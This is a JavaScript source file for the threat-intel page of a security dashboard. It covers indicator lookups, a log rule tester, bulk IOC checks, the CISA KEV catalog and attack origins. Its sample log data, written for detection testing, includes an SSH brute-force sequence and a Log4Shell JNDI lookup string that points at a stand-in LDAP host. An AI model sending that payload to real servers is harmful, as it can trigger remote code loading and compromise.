import { $, $$, api, esc, sev, ago, stamp, emptyState, toast, busy, emit, can, num, markPayload } from '../core.js';
import { icon, hydrateIcons } from '../icons.js';
import { lookupTab, feedsTab, VERDICT_C } from './intel-lookup.js';

// Indicator lookup, detection rules (built-in and SigmaHQ), bulk IOC checks, feed
// status, the CISA KEV catalog and attacker origins. Every number on this page comes
// from the API; nothing is filled in client-side.

const TABS = [['lookup', 'Lookup'], ['detect', 'Detections'], ['ioc', 'Bulk check'], ['feeds', 'Feeds & Sigma'], ['kev', 'Exploited CVEs'], ['origins', 'Attack origins']];
const SAMPLE = `Oct 17 09:41:02 bastion sshd[2211]: Failed password for root from 203.0.113.50 port 51112 ssh2
Oct 17 09:41:04 bastion sshd[2211]: Failed password for root from 203.0.113.50 port 51120 ssh2
Oct 17 09:41:07 bastion sshd[2213]: Invalid user oracle from 203.0.113.50 port 51188
Oct 17 09:41:09 bastion sshd[2213]: Failed password for invalid user oracle from 203.0.113.50 port 51188 ssh2
Oct 17 09:41:12 bastion sshd[2219]: Failed password for ubuntu from 203.0.113.50 port 51230 ssh2
Oct 17 09:41:30 bastion sshd[2230]: Accepted password for ubuntu from 203.0.113.50 port 51302 ssh2
198.51.100.23 - - [17/Oct/2026:09:42:10 +0000] "GET /?x=\${jndi:ldap://198.51.100.23:1389/a} HTTP/1.1" 200 612 "-" "curl/8.4.0"`;

let ctx = null;

export async function render({ el, navigate, query }) {
  ctx = { el, navigate, query, tab: TABS.some(([k]) => k === query.tab) ? query.tab : query.tab === 'detections' ? 'detect' : 'lookup' };
  el.innerHTML = `
    <div class="page-head">
      <div class="page-head__text">
        <h1 class="page-title">Threat intel</h1>
        <p class="page-sub">Look up any indicator across abuse.ch, MISP, RDAP and passive DNS, run SigmaHQ and built-in rules on your logs, and track what CISA says is being exploited.</p>
      </div>
    </div>
    <section class="panel reveal">
      <div class="tabs" role="tablist">${TABS.map(([k, t]) => `<button class="tab" data-tab="${k}" role="tab">${t}</button>`).join('')}</div>
      <div id="in-body"></div>
    </section>`;
  $$('[data-tab]', el).forEach((b) => { b.onclick = () => { ctx.tab = b.dataset.tab; ctx.query = {}; history.replaceState(null, '', `#/intel?tab=${ctx.tab}`); paint(); }; });
  await paint();
}

export function onDataChanged() { if (ctx && ctx.tab === 'detect' && document.body.contains(ctx.el)) paint(); }

async function paint() {
  const { el } = ctx;
  $$('[data-tab]', el).forEach((t) => { const on = t.dataset.tab === ctx.tab; t.classList.toggle('is-on', on); t.setAttribute('aria-selected', on); });
  const body = $('#in-body', el);
  body.innerHTML = '<div class="panel__body"><div class="skeleton" style="height:140px"></div></div>';
  try {
    if (ctx.tab === 'lookup') lookupTab(body, { navigate: ctx.navigate, query: ctx.query });
    else if (ctx.tab === 'detect') await detections(body);
    else if (ctx.tab === 'ioc') iocCheck(body);
    else if (ctx.tab === 'feeds') await feedsTab(body, { navigate: ctx.navigate });
    else if (ctx.tab === 'kev') await kevTab(body);
    else await origins(body);
  } catch (e) {
    body.innerHTML = `<div class="panel__body">${emptyState('Could not load', e.message, 'alert')}</div>`;
  }
  hydrateIcons(body);
}

// ---- Detections -----------------------------------------------------------------
async function detections(body) {
  const d = await api('/detect/rules');
  const configure = can('configure');
  body.innerHTML = `
    <div class="intel-split">
      <div>
        <div class="panel__body">
          <div class="row wrap" style="justify-content:space-between">
            <div><b>Built-in rules</b> <span class="small muted">run on every batch sent to /api/ingest/logs</span></div>
            ${d.enabled ? '<span class="tag tag--ok">active</span>' : '<span class="tag tag--warn">switched off in Settings</span>'}
          </div>
          <div class="small muted mt-8">Thresholds: ${d.settings.detectSshThreshold} failed SSH logins or ${d.settings.detectScanThreshold} 403/404s from one address within ${d.settings.detectWindowMin} min. Change them under Settings.</div>
        </div>
        <div class="table-wrap"><table class="table"><thead><tr><th>Rule</th><th class="hide-sm">ATT&amp;CK</th><th class="num">30 days</th><th class="num">Open</th><th class="num hide-sm">Last hit</th>${configure ? '<th></th>' : ''}</tr></thead><tbody class="rows-in">
          ${d.rules.map((r, i) => `<tr style="--i:${i}" class="${r.enabled ? '' : 'is-dim'}">
            <td><span class="cell-main">${sev(r.severity)} ${esc(r.name)}</span><span class="cell-sub">${esc(r.help)}</span></td>
            <td class="hide-sm small"><span class="mono">${esc(r.technique.split(' ')[0])}</span><span class="cell-sub">${esc(r.tactic)}</span></td>
            <td class="num">${num(r.hits_30d)}</td><td class="num">${num(r.open)}</td><td class="num hide-sm small muted">${r.last_hit ? ago(r.last_hit) : '-'}</td>
            ${configure ? `<td style="width:60px"><button class="switch" role="switch" aria-checked="${r.enabled}" aria-label="Enable ${esc(r.name)}" data-rule="${esc(r.id)}"></button></td>` : ''}
          </tr>`).join('')}
        </tbody></table></div>
        <div class="panel__body">
          <h3 class="section-title">Web patterns checked in request lines</h3>
          <div class="row wrap">${d.web_patterns.map((w) => `<span class="tag" title="${esc(w.severity)}">${esc(w.label)} <span class="muted">${esc(w.ref)}</span></span>`).join('')}</div>
          <h3 class="section-title" style="margin-top:20px">Raised recently</h3>
          ${d.recent.length ? `<div class="rows-in">${d.recent.map((a, i) => `<div class="list__item is-clickable" style="--i:${i}" data-alert="${esc(a.alert_id)}">${sev(a.severity)}<div style="min-width:0"><div class="list__title truncate">${esc(a.signature)}</div><div class="list__sub"><span class="mono">${esc(a.alert_id)}</span><span>${ago(a.detected_at)}</span></div></div></div>`).join('')}</div>`
            : '<p class="small muted" style="margin:0">Nothing raised yet. Ship sshd or web server logs with the agent, or try the tester.</p>'}
        </div>
      </div>
      <aside class="intel-side">
        <div class="panel__body">
          <b>Rule tester</b>
          <p class="small muted" style="margin:4px 0 10px">Paste raw lines from auth.log or an access log. They run through the same rules as live ingest. Nothing is stored.</p>
          <label class="field"><span>Host the lines came from</span><input class="input input--mono" id="dt-host" placeholder="10.0.4.102" value="10.0.0.10"></label>
          <label class="field mt-8"><span>Log lines</span><textarea class="textarea" id="dt-lines" rows="9" spellcheck="false" placeholder="sshd[811]: Failed password for root from 203.0.113.9 port 4821 ssh2"></textarea></label>
          <div class="row mt-8"><button class="btn btn--primary btn--sm" id="dt-run">${icon('play')}Run rules</button><button class="btn btn--ghost btn--sm" id="dt-sample">Load example</button></div>
          <div id="dt-out" class="mt-12"></div>
        </div>
      </aside>
    </div>`;
  $$('[data-alert]', body).forEach((r) => { r.onclick = () => ctx.navigate(`investigate/${r.dataset.alert}`); });
  $$('[data-rule]', body).forEach((sw) => {
    sw.onclick = async () => {
      const off = new Set(d.rules.filter((r) => !r.enabled).map((r) => r.id));
      if (off.has(sw.dataset.rule)) off.delete(sw.dataset.rule); else off.add(sw.dataset.rule);
      try {
        await api('/config', { method: 'PUT', body: { detectDisabled: [...off] } });
        toast('Rule updated', off.has(sw.dataset.rule) ? 'It will not raise new alerts.' : 'It applies to the next batch.', 'ok');
        paint();
      } catch (e) { toast('Not saved', e.message, 'error'); }
    };
  });
  $('#dt-sample', body).onclick = () => { $('#dt-lines', body).value = SAMPLE; };
  $('#dt-run', body).onclick = (e) => busy(e.currentTarget, async () => {
    const out = $('#dt-out', body);
    try {
      const r = await api('/detect/test', { method: 'POST', body: { host_ip: $('#dt-host', body).value.trim(), lines: $('#dt-lines', body).value } });
      const types = Object.entries(r.by_type).map(([k, n]) => `${n} ${k}`).join(', ');
      out.innerHTML = `<div class="small muted">${r.parsed} lines parsed (${esc(types || 'none')})${r.without_client ? `, ${r.without_client} without a remote address` : ''}${r.rejected.length ? `, ${r.rejected.length} rejected` : ''}</div>
        <div class="dt-group">Built-in rules</div>
        ${r.findings.length ? `<div class="rows-in">${r.findings.map((f, i) => `<div class="finding" style="--i:${i}"><div class="row">${sev(f.severity)}<span class="mono small">${esc(f.rule)}</span>${f.ref ? `<span class="tag">${esc(f.ref)}</span>` : ''}</div><div class="finding__sig">${esc(f.signature)}</div><pre class="code">${f.evidence.map(markPayload).join('\n')}</pre></div>`).join('')}</div>`
          : '<p class="small muted" style="margin:0">None fired.</p>'}
        <div class="dt-group">SigmaHQ${r.sigma && r.sigma.loaded ? ` <span class="muted">${num(r.sigma.rules)} rules, ${esc(r.sigma.version || '')}</span>` : ''}</div>
        ${!r.sigma || (!r.sigma.loaded && !r.sigma.loading) ? '<p class="small muted" style="margin:0">Sigma is off on this server.</p>'
          : r.sigma.loading ? '<p class="small muted" style="margin:0">The rule pack is still downloading. Run again in a few seconds.</p>'
          : r.sigma.findings.length ? `<div class="rows-in">${r.sigma.findings.map((f, i) => `<div class="finding finding--sigma" style="--i:${i}"><div class="row wrap">${sev(f.severity)}${f.technique ? `<span class="tag">${esc(f.technique)}</span>` : ''}${f.cve ? `<span class="tag tag--kev">${esc(f.cve)}</span>` : ''}</div><div class="finding__sig">${f.link ? `<a class="ip-link" href="${esc(f.link)}" target="_blank" rel="noopener noreferrer">${esc(f.title)}</a>` : esc(f.title)}</div><pre class="code">${f.evidence.map(markPayload).join('\n')}</pre></div>`).join('')}</div>`
          : '<p class="small muted" style="margin:0">None fired.</p>'}`;
      hydrateIcons(out);
    } catch (err) { out.innerHTML = `<div class="notice notice--warn">${icon('alert')}<div>${esc(err.message)}</div></div>`; hydrateIcons(out); }
  });
}

// ---- Bulk IOC check -------------------------------------------------------------
function iocCheck(body) {
  body.innerHTML = `
    <div class="panel__body">
      <p class="small muted" style="margin:0 0 10px">Paste up to 100 indicators in any format: a list, CSV, log lines or defanged IOCs like 203.0.113[.]7 or hxxps://bad[.]example. IPs go to Spamhaus DROP, FireHOL, Tor, GreyNoise, Shodan InternetDB${state.abuse ? ', AbuseIPDB' : ''}, Feodo and ThreatFox; domains, URLs and hashes to ThreatFox, URLhaus, MalwareBazaar, MISP and RDAP.</p>
      <textarea class="textarea" id="ioc-in" rows="6" spellcheck="false" placeholder="185.220.101.45&#10;update-check[.]example, 44d88612fea8a8f36de82e1278abb02f"></textarea>
      <div class="row mt-8"><button class="btn btn--primary" id="ioc-go">${icon('search')}Check all</button><span class="small muted" id="ioc-n"></span>
        <div class="grow"></div><button class="btn btn--sm btn--ghost" id="ioc-csv" disabled>${icon('download')}CSV</button></div>
    </div>
    <div id="ioc-out"></div>`;
  const ta = $('#ioc-in', body);
  const count = () => {
    // Rough client-side count; the server does the real parsing.
    const s = ta.value.replace(/\[\.\]|\(\.\)/g, '.').replace(/hxxp/gi, 'http');
    const n = new Set([...(s.match(/https?:\/\/[^\s"'<>]+/gi) || []), ...(s.replace(/https?:\/\/[^\s"'<>]+/gi, ' ').match(/\b(?:\d{1,3}\.){3}\d{1,3}\b|\b[a-f0-9]{32}\b|\b[a-f0-9]{40}\b|\b[a-f0-9]{64}\b|\b(?:[a-z0-9-]+\.)+[a-z]{2,24}\b/gi) || [])].map((x) => x.toLowerCase())).size;
    $('#ioc-n', body).textContent = n ? `about ${n} indicator${n === 1 ? '' : 's'}` : '';
  };
  ta.oninput = count;
  let last = null;
  $('#ioc-go', body).onclick = (e) => busy(e.currentTarget, async () => {
    const out = $('#ioc-out', body);
    out.innerHTML = '<div class="panel__body"><div class="skeleton" style="height:120px"></div><p class="small muted">Querying sources. Fresh lookups take a few seconds each, five at a time.</p></div>';
    try {
      last = await api('/intel/bulk', { method: 'POST', body: { ips: ta.value } });
      $('#ioc-csv', body).disabled = false;
      const s = last.summary;
      out.innerHTML = `
        <div class="ioc-sum">${[['malicious', s.malicious], ['suspicious', s.suspicious], ['clean', s.clean], ['internal', s.internal], ['unknown', s.unknown]].map(([k, n]) => `<div><i style="background:${VERDICT_C[k]}"></i><b>${n}</b><span>${k}</span></div>`).join('')}</div>
        <div class="table-wrap"><table class="table"><thead><tr><th>Indicator</th><th>Verdict</th><th class="hide-sm">Network / registrar</th><th class="hide-sm">Seen by</th><th class="num">Alerts</th><th></th></tr></thead><tbody class="rows-in">
          ${last.results.sort((a, b) => (b.score ?? -1) - (a.score ?? -1)).map((r, i) => `<tr style="--i:${Math.min(i, 30)}" class="is-clickable" data-ip="${esc(r.ip)}" data-type="${esc(r.type || 'ipv4')}">
            <td><span class="cell-main mono truncate" style="max-width:320px;display:block" title="${esc(r.ip)}">${esc(r.ip)}</span><span class="cell-sub">${r.type && !/^ipv/.test(r.type) ? `${esc(r.type)}${r.age_days != null ? ` &middot; ${num(r.age_days)} days old` : ''}` : ''}${r.country ? esc(r.country) : ''}${r.asn ? ` &middot; ${esc(r.asn)}` : ''}</span></td>
            <td><span class="ioc-verdict" style="--c:${VERDICT_C[r.verdict] || 'var(--ink-3)'}">${esc(r.verdict)}</span>${r.score != null ? ` <span class="mono small">${r.score}</span>` : ''}</td>
            <td class="hide-sm small truncate" style="max-width:220px">${esc(r.org || (r.internal ? 'internal range' : r.error || '-'))}</td>
            <td class="hide-sm small">${r.c2 ? '<span class="tag tag--warn">C2</span> ' : ''}${(r.families || []).map((f) => `<span class="tag">${esc(f)}</span>`).join(' ')} ${(r.listed || []).map((l) => `<span class="tag tag--warn">${esc(l)}</span>`).join(' ')}${r.greynoise && r.greynoise !== 'unknown' ? ` <span class="tag">GreyNoise ${esc(r.greynoise)}</span>` : ''}${r.vulns ? ` <span class="tag">${r.vulns} CVEs</span>` : ''}</td>
            <td class="num">${r.alerts || '-'}</td>
            <td class="small">${r.blocked ? '<span class="tag tag--ok">blocked</span>' : ''}</td>
          </tr>`).join('')}
        </tbody></table></div>`;
      $$('[data-ip]', out).forEach((r) => { r.onclick = () => ctx.navigate(/^ipv/.test(r.dataset.type) ? `ip/${r.dataset.ip}` : `intel?tab=lookup&q=${encodeURIComponent(r.dataset.ip)}`); });
      emit('data:changed');
    } catch (err) { out.innerHTML = `<div class="panel__body"><div class="notice notice--warn">${icon('alert')}<div>${esc(err.message)}</div></div></div>`; hydrateIcons(out); }
  });
  $('#ioc-csv', body).onclick = () => {
    if (!last) return;
    const cols = ['ip', 'type', 'verdict', 'score', 'c2', 'families', 'country', 'asn', 'org', 'age_days', 'listed', 'greynoise', 'vulns', 'alerts', 'blocked'];
    const q = (v) => `"${String(Array.isArray(v) ? v.join(' ') : v ?? '').replace(/"/g, '""')}"`;
    const csv = [cols.join(','), ...last.results.map((r) => cols.map((c) => q(r[c])).join(','))].join('\r\n');
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([`\ufeff${csv}`], { type: 'text/csv' }));
    a.download = `aegis-ioc-check-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
  };
}

// ---- CISA KEV ---------------------------------------------------------------------
async function kevTab(body) {
  const d = await api('/intel/kev');
  const s = d.status;
  const configure = can('configure');
  body.innerHTML = `
    <div class="panel__body row wrap" style="justify-content:space-between">
      <div class="small">${s.loaded ? `<span class="live-dot"></span> CISA catalog <b class="mono">${esc(s.catalog_version || '')}</b>, ${num(s.entries)} actively exploited CVEs, fetched ${ago(s.fetched_at)}` : `<span class="live-dot live-dot--off"></span> Catalog not loaded${s.error ? `: ${esc(s.error)}` : ''}`}</div>
      ${configure ? `<button class="btn btn--sm" id="kev-sync">${icon('refresh')}Flag CVE records</button>` : ''}
    </div>
    <div class="grid kev-grid" style="padding:0 14px 14px">
      <section>
        <h3 class="section-title">In your CVE records</h3>
        ${d.local.length ? `<div class="table-wrap"><table class="table"><thead><tr><th>CVE</th><th class="num">CVSS</th><th>Hosts</th><th class="num">CISA due</th></tr></thead><tbody class="rows-in">${d.local.map((c, i) => `<tr style="--i:${i}">
          <td><span class="cell-main mono">${esc(c.cve_id)}${c.ransomware ? ' <span class="tag tag--kev" title="Known ransomware campaign use">ransomware</span>' : ''}</span><span class="cell-sub truncate" style="max-width:230px" title="${esc(c.title)}">${esc(c.title)}</span></td>
          <td class="num">${c.cvss_score}</td>
          <td class="small">${c.hosts.length ? c.hosts.map((h) => `<span class="tag tag--warn">${esc(h.hostname)}</span>`).join(' ') : '<span class="muted">none exposed</span>'}</td>
          <td class="num small nowrap">${esc(c.due || '-')}</td></tr>`).join('')}</tbody></table></div>`
          : emptyState('No overlap', s.loaded ? 'None of your CVE records are on the KEV list. Use "Find CVEs" on a host to pull the CVEs for what it runs.' : 'Load the catalog to compare.', 'shield')}
      </section>
      <section>
        <h3 class="section-title">Latest additions by CISA</h3>
        ${d.recent.length ? `<div class="rows-in">${d.recent.map((k, i) => `<div class="kev-row" style="--i:${i}">
          <div class="row"><b class="mono">${esc(k.cve_id)}</b><span class="small muted">${esc(k.vendor || '')} ${esc(k.product || '')}</span><span class="grow"></span><span class="small muted mono">${esc(k.added || '')}</span></div>
          <div class="small">${esc(k.name || '')}</div>
          ${k.ransomware ? '<span class="tag tag--kev mt-8">used by ransomware</span>' : ''}
        </div>`).join('')}</div>` : '<p class="small muted">Catalog unavailable.</p>'}
      </section>
    </div>`;
  const b = $('#kev-sync', body);
  if (b) b.onclick = () => busy(b, async () => {
    try {
      const r = await api('/intel/kev/sync', { method: 'POST', body: {} });
      toast('CVE records checked', `${r.updated} record${r.updated === 1 ? '' : 's'} changed against ${num(r.catalog.entries)} KEV entries.`, 'ok');
      emit('data:changed');
      paint();
    } catch (e) { toast('Sync failed', e.message, 'error'); }
  });
}

// ---- Attack origins -----------------------------------------------------------------
async function origins(body) {
  const d = await api('/intel/origins?days=30');
  if (!d.sources) {
    body.innerHTML = `<div class="panel__body">${emptyState('No external sources', 'No alert in the last 30 days came from a public address.', 'globe')}</div>`;
    return;
  }
  const maxC = Math.max(1, ...d.countries.map((c) => c.alerts));
  const maxN = Math.max(1, ...d.networks.map((c) => c.alerts));
  const bars = (list, max) => list.map((g, i) => `<div class="hbar" style="--i:${i};grid-template-columns:minmax(0,150px) 1fr 54px"><span class="truncate" title="${esc(g.label)}">${esc(g.label)}</span><div class="hbar__track"><div class="hbar__fill" style="--c:var(--accent);width:${(g.alerts / max) * 100}%"></div></div><span class="hbar__n">${g.alerts} <span class="muted">/${g.ips}</span></span></div>`).join('');
  body.innerHTML = `
    <div class="panel__body small muted">${num(d.sources)} public source addresses in alerts over the last ${d.days} days. ${d.intel ? `The top ${d.ips.length} were geolocated live (${d.located} resolved).` : 'Threat intel is off, so locations are not resolved.'}</div>
    <div class="grid grid-1-1" style="padding:0 14px 14px">
      <section><h3 class="section-title">Countries <span class="muted">(alerts / addresses)</span></h3>${d.countries.length ? bars(d.countries, maxC) : '<p class="small muted">No locations resolved.</p>'}</section>
      <section><h3 class="section-title">Networks</h3>${d.networks.length ? bars(d.networks, maxN) : '<p class="small muted">No networks resolved.</p>'}</section>
    </div>
    <div class="table-wrap"><table class="table"><thead><tr><th>Source</th><th class="hide-sm">Location</th><th>Reputation</th><th class="num">Alerts</th><th class="num">Open</th></tr></thead><tbody class="rows-in">
      ${d.ips.map((r, i) => `<tr class="is-clickable" style="--i:${i}" data-ip="${esc(r.ip)}"><td class="mono">${esc(r.ip)}</td>
        <td class="hide-sm small">${esc([r.city, r.country].filter(Boolean).join(', ') || '-')}<span class="cell-sub">${esc(r.org || '')}</span></td>
        <td>${r.verdict ? `<span class="ioc-verdict" style="--c:${VERDICT_C[r.verdict] || 'var(--ink-3)'}">${esc(r.verdict)}</span>` : '-'}</td>
        <td class="num">${r.alerts}</td><td class="num">${r.open}</td></tr>`).join('')}
    </tbody></table></div>`;
  $$('[data-ip]', body).forEach((r) => { r.onclick = () => ctx.navigate(`ip/${r.dataset.ip}`); });
}

const state = { abuse: false };
api('/health').then((h) => { state.abuse = Boolean(h.intel && h.intel.abuseipdb); }).catch(() => {});